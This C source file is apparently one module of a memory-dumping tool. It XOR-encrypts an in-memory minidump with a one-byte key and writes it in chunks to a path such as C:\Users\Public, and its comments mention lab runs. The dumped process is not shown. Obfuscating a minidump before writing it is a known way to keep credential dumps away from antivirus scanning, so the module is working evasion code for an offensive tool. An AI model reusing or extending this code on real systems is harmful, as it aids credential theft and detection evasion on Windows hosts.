/*
 * output.c — XOR-encrypt the in-memory minidump and write to disk.
 *
 * Writes to a caller-supplied path, typically C:\Users\Public\<name>.dat
 * to avoid per-user ACL prompts during lab runs.
 */
#include "common.h"

BOOL out_write_obfusc(BYTE *buf, SIZE_T n, BYTE key, const wchar_t *path) {
    xor_buffer(buf, n, key);

    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        ERR("CreateFileW(%ls) err=%lu", path, GetLastError());
        return FALSE;
    }
    DWORD written = 0, total = 0;
    while (total < n) {
        DWORD chunk = (DWORD)((n - total) > 0x100000 ? 0x100000 : (n - total));
        if (!WriteFile(h, buf + total, chunk, &written, NULL) || written != chunk) {
            ERR("WriteFile err=%lu (wrote %lu/%lu chunk)", GetLastError(),
                written, chunk);
            CloseHandle(h);
            return FALSE;
        }
        total += written;
    }
    CloseHandle(h);
    LOG("output: wrote %zu bytes (xor 0x%02x) to %ls", n, key, path);
    return TRUE;
}
